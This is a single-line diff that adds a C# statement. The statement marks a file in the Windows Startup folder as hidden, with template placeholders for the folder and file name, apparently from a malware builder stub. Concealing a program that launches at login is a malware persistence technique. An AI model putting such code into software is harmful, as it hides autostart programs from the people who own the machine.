@@ -1,0 +1,1 @@
+File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.[STARTUPFOLDERSHIZ]) + "\\[FILENAMESUP]", FileAttributes.Hidden);
